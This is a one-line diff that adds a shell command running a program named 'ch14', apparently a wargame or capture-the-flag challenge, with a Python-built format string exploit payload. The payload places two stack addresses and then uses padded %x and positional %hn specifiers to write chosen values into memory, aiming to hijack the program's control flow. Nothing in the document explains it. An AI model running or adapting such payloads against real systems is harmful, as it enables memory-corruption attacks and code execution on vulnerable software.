@@ -1,0 +1,1 @@
+./ch14 `python -c "print '\xb8\xfb\xff\xbf\xba\xfb\xff\xbf%048871x%152\\\$hn%08126x%153\\\$hnA'"`
